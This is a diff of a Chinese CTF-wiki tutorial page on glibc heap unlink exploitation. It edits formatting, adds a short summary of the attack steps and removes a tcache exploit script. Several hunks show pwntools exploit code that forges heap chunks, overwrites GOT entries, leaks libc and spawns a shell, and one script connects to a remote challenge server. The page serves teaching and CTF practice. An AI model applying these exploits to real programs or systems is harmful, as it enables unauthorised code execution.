@@ -10,7 +10,7 @@ typora-root-url: ../../../docs
 
 我们先来简单回顾一下 unlink 的目的与过程，其目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下
 
-![](./figure/unlink_smallbin_intro.png)
+![](./implementation/figure/unlink_smallbin_intro.png)
 
 下面我们首先介绍一下 unlink 最初没有防护时的利用方法，然后介绍目前利用 unlink 的方式。
 
@@ -102,6 +102,27 @@ if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
 ```
 
 **此外，其实如果我们设置next chunk 的 fd 和 bk 均为 nextchunk 的地址也是可以绕过上面的检测的。但是这样的话，并不能达到修改指针内容的效果。**
+
+## 利用思路
+
+### 条件
+
+1. UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针
+2. 已知位置存在一个指针指向可进行 UAF 的 chunk
+
+### 效果
+
+使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18
+
+### 思路
+
+设指向可 UAF chunk 的指针的地址为 ptr
+
+1. 修改 fd 为 ptr - 0x18
+2. 修改 bk 为 ptr - 0x10
+3. 触发 unlink
+
+ptr 处的指针会变为 ptr - 0x18。
 
 ## 2014 HITCON stkof
 
@@ -306,7 +327,7 @@ Last Remainder: 0
 }
 ```
 
-此后，无论是输入输出都不会再申请缓冲去了。所以我们最好最初的申请一个 chunk 来把这些缓冲区给申请了，方便之后操作。
+此后，无论是输入输出都不会再申请缓冲区了。所以我们最好最初的申请一个 chunk 来把这些缓冲区给申请了，方便之后操作。
 
 但是，比较有意思的是，如果我们是 attach 上去的话，第一个缓冲区分配的大小为 4096 大小。
 
@@ -396,25 +417,29 @@ def exp():
     payload += p64(head + 16 - 0x10)  #bk
     payload += p64(0x20)  # next chunk's prev_size bypass the check
     payload = payload.ljust(0x30, 'a')
+
     # overwrite global[3]'s chunk's prev_size
     # make it believe that prev chunk is at global[2]
     payload += p64(0x30)
+
     # make it believe that prev chunk is free
     payload += p64(0x90)
     edit(2, len(payload), payload)
+
     # unlink fake chunk, so global[2] =&(global[2])-0x18=head-8
     free(3)
     p.recvuntil('OK\n')
-    #gdb.attach(p)
+
     # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got
     payload = 'a' * 8 + p64(stkof.got['free']) + p64(stkof.got['puts']) + p64(
         stkof.got['atoi'])
     edit(2, len(payload), payload)
+
     # edit free@got to puts@plt
     payload = p64(stkof.plt['puts'])
     edit(0, len(payload), payload)
 
-    #free global[1] to leak puts addr
+    # free global[1] to leak puts addr
     free(1)
     puts_addr = p.recvuntil('\nOK\n', drop=True).ljust(8, '\x00')
     puts_addr = u64(puts_addr)
@@ -425,6 +450,7 @@ def exp():
     log.success('libc base: ' + hex(libc_base))
     log.success('/bin/sh addr: ' + hex(binsh_addr))
     log.success('system addr: ' + hex(system_addr))
+
     # modify atoi@got to system addr
     payload = p64(system_addr)
     edit(2, len(payload), payload)
@@ -434,147 +460,7 @@ def exp():
 
 if __name__ == "__main__":
     exp()
-
 ```
-
-### tcache exploit
-
-本题可以溢出较长字节，因此可以覆盖 chunk 的 fd 指针，在 libc 2.26 之后的 tcache 机制中，未对 fd 指针指向的 chunk 进行 size 检查，从而可以将 fd 指针覆盖任意地址。在 free 该被溢出 chunk 并且两次 malloc 后可以实现任意地址修改：
-
-```python
-from pwn import *
-from GdbWrapper import GdbWrapper
-from one_gadget import generate_one_gadget
-
-context.log_level = "info"
-context.endian = "little"
-context.word_size = 64
-context.os = "linux"
-context.arch = "amd64"
-context.terminal = ["deepin-terminal", "-x", "zsh", "-c"]
-
-def Alloc(io, size):
-    io.sendline("1")
-    io.sendline(str(size))
-    io.readline()
-    io.readline()
-def Edit(io, index, length, buf):
-    io.sendline("2")
-    io.sendline(str(index))
-    io.sendline(str(length))
-    io.send(buf)
-    io.readline()
-def Free(io, index):
-    io.sendline("3")
-    io.sendline(str(index))
-    try:
-        tmp = io.readline(timeout = 3)
-    except Exception:
-        io.interactive()
-    print tmp
-    if "OK" not in tmp and "FAIL" not in tmp:
-        return tmp
-
-def main(binary, poc):
-    # test env
-    bss_ptrlist = None
-    free_index = None
-    free_try = 2
-    elf = ELF(binary)
-    libc_real = elf.libc.path[: elf.libc.path.rfind('/') + 1]
-
-    assert elf.arch == "amd64" and (os.path.exists(libc_real + "libc-2.27.so") or os.path.exists(libc_real + "libc-2.26.so"))
-    while bss_ptrlist == None:
-        # find bss ptr
-        io = process(binary)
-        gdbwrapper = GdbWrapper(io.pid)
-        # gdb.attach(io)
-        Alloc(io, 0x400)
-        Edit(io, 1, 0x400, "a" * 0x400)
-        Alloc(io, 0x400)
-        Edit(io, 2, 0x400, "b" * 0x400)
-        Alloc(io, 0x400)
-        Edit(io, 3, 0x400, "c" * 0x400)
-        Alloc(io, 0x400)
-        Edit(io, 4, 0x400, "d" * 0x400)
-        Alloc(io, 0x400)
-        Edit(io, 5, 0x400, "e" * 0x400)
-        heap = gdbwrapper.heap()
-        heap = [(k, heap[k]) for k in sorted(heap.keys())]
-        ptr_addr = []
-        index = 1
-        while True:
-            for chunk in heap:
-                address = chunk[0]
-                info = chunk[1]
-                ptr_addr_length = len(ptr_addr)
-                if (info["mchunk_size"] & 0xfffffffffffffffe) == 0x410:
-                    for x in gdbwrapper.search("bytes", str(chr(ord('a') + index - 1)) * 0x400):
-                        if int(address, 16) + 0x10 == x["ADDR"]:
-                            tmp = gdbwrapper.search("qword", x["ADDR"])
-                            for y in tmp:
-                                if binary.split("/")[-1] in y["PATH"]:
-                                    ptr_addr.append(y["ADDR"])
-                                    break
-                        if (len(ptr_addr) != ptr_addr_length):
-                            break
-                if len(ptr_addr) != ptr_addr_length:
-                    break
-            index += 1
-            if (index == 5):
-                break
-        bss_ptrlist = sorted(ptr_addr)[0]
-        io.close()
-    while free_index == None:
-        io = process(binary)
-        Alloc(io, 0x400)
-        Alloc(io, 0x400)
-        Alloc(io, 0x400)
-        Free(io, free_try)
-        Edit(io, free_try - 1, 0x400 + 0x18, "a" * 0x400 + p64(0) + p64(1041) + p64(0x12345678))
-        try:
-            Alloc(io, 0x400)
-            Alloc(io, 0x400)
-        except Exception:
-            free_index = free_try
-        free_try += 1
-        io.close()
-    # arbitrary write
-    libc = ELF(binary).libc
-    one_gadget_offsets = generate_one_gadget(libc.path)
-    for one_gadget_offset in one_gadget_offsets:
-        io = process(binary)
-        libc = elf.libc
-        gdbwrapper = GdbWrapper(io.pid)
-        Alloc(io, 0x400)
-        Alloc(io, 0x400)
-        Alloc(io, 0x400)
-        Free(io, free_index)
-        Edit(io, free_index - 1, 0x400 + 0x18, "a" * 0x400 + p64(0) + p64(1041) + p64(bss_ptrlist - 0x08))
-        Alloc(io, 0x400)
-        Alloc(io, 0x400)
-        ###leak libc
-        Edit(io, 5, 0x18, p64(elf.got["free"]) * 2 + p64(elf.got["malloc"]))
-        Edit(io, 0, 0x08, p64(elf.plt["puts"]))
-        leaked = u64(Free(io, 2)[:-1].ljust(8, "\x00"))
-        libc_base = leaked - libc.symbols["malloc"]
-        system_addr = libc_base + libc.symbols["system"]
-        one_gadget_addr = libc_base + one_gadget_offset
-        Edit(io, 1, 0x08, p64(one_gadget_addr))
-        Free(io, 1)
-        try:
-            io.sendline("id")
-            log.info(io.readline(timeout=3))
-        except Exception, e:
-            io.close()
-            continue
-        io.interactive()
-
-if __name__ == "__main__":
-    binary = "./bins/a679df07a8f3a8d590febad45336d031-stkof"
-    main(binary, "")
-```
-
 
 ## 2016 ZCTF note2
 [题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2016_zctf_note2)
@@ -981,36 +867,48 @@ def write(where, what):
 
 def exp():
     print "step 1"
+
     # add a fastbin chunk 0x20 and free it
     # so it is in fastbin, idx2->NULL
     add(2, 1)  # idx2
     remove(2)
+
     # overflow bender inuse with 1
     overflow_benderinuse('\x01')
+
     # change bender's fd to 0x603138, point to bender's size
     # now fastbin 0x20, idx2->0x603138->NULL
     change(2, p64(0x603138))
+
     # in order add bender again
     overflow_benderinuse('\x00')
+
     # add bender again, fastbin 0x603138->NULL
     add(2, 1)
+
     # in order to malloc chunk at 0x603138
     # we need to bypass the fastbin size check, i.e. set *0x603140=0x20
     # it is at Robot Devil
     add(3, 0x20)
+
     # trigger malloc, set tinny point to 0x603148
     add(1)
+
     # wheels must <= 3
     remove(2)
     remove(3)
 
     print 'step 2'
+
     # alloc Destructor size 60->0x50, chunk content 0x40
     add(6, 3)
+
     # alloc devil, size=20*7=140, bigger than fastbin
     add(3, 7)
+
     # edit destructor's size to 1000 by tinny
     change(1, p64(1000))
+
     # place fake chunk at destructor's pointer
     fakechunk_addr = 0x6030E8
     fakechunk = p64(0) + p64(0x20) + p64(fakechunk_addr - 0x18) + p64(
@@ -1018,21 +916,26 @@ def exp():
     fakechunk = fakechunk.ljust(0x40, 'a')
     fakechunk += p64(0x40) + p64(0xa0)
     change(6, fakechunk)
+
     # trigger unlink
     remove(3)
 
     print 'step 3'
+
     # make 0x6030F8 point to 0x6030E8
     payload = p64(0) * 2 + 0x18 * 'a' + p64(0x6030E8)
     change(6, payload)
 
     print 'step 4'
+
     # make exit just as return
     write(robots.got['exit'], 0x401954)
 
     print 'step 5'
+
     # set wheel cnt =3, 0x603130 in order to start robot
     write(0x603130, 3)
+
     # set destructor point to puts@got
     change(1, p64(robots.got['puts']))
     start_robot()
@@ -1047,13 +950,13 @@ def exp():
 
     # make free->system
     write(robots.got['free'], system_addr)
+
     # make destructor point to /bin/sh addr
     write(0x6030E8, binsh_addr)
+
     # get shell
     remove(6)
     p.interactive()
-
-    pass
 
 
 if __name__ == "__main__":
@@ -1263,7 +1166,6 @@ def free(id):
     conn.sendline(str(id))
     print conn.recvuntil('success')
 
-#conn = remote('127.0.0.1',9999)
 conn = remote('115.28.27.103',9003)
 free_got = p64(0x602018)
 puts_got = p64(0x602020)
@@ -1272,10 +1174,13 @@ printf_got = p64(0x602030)
 exit_got = p64(0x602078)
 printf_plt = p64(0x400750)
 puts_plt = p64(0x400730)
+
 #libcstartmain_ret_off = 0x21b45
 #sys_off = 0x414f0
+
 libcstartmain_ret_off = 0x21ec5
 sys_off = 0x46640
+
 # 1. int overflow lead to double free
 intoverflow = -9223372036854775808
 malloc(512,'/bin/sh\0')
@@ -1286,38 +1191,47 @@ malloc(512,'/bin/sh\0')
 malloc(512,'/bin/sh\0')
 malloc(512,p64(0x400ef8))
 malloc(512,'/bin/sh\0')
+
 # 2. make a fake chunk and modify the next chunk's pre size
 fakechunk = p64(0) + p64(512+1) + p64(0x6020e0-0x18) + p64(0x6020e0-0x10) + 'A'*(512-32) + p64(512) + p64(512+16)
 edit(3,'aaaaaa')
 edit(intoverflow,fakechunk)
+
 # 3. double free
 free(4)
+
 # 4. overwrite got
 edit(3,free_got)
 edit(0,printf_plt+printf_plt)
+
 # 5. leak the stack data
 edit(3,p64(0x6020e8))
 edit(0,'%llx.'*30)
-#free->puts
+
+# free->puts
 print conn.recvuntil('>>')
 conn.sendline('4')
 print conn.recvuntil('note:')
 conn.sendline(str(0))
-#time.sleep(0.3)
+
 ret =  conn.recvuntil('success')
 print ret
+
 # 6. calcuate the system's addr
 libcstart = ret.split('.')[10]
 libcstart_2 = int(libcstart,16) - libcstartmain_ret_off
 print 'libc start addr:',hex(libcstart_2)
 system_addr = libcstart_2 + sys_off
 print 'system_addr:',hex(system_addr)
+
 # 7. overwrite free's got
 edit(3,free_got)
 edit(0,p64(system_addr)+printf_plt)
+
 # 8. write argv
 edit(3,p64(0x6020d0))
 edit(0,'/bin/sh\0')
+
 # 9. exploit
 print conn.recvuntil('>>')
 conn.sendline('4')
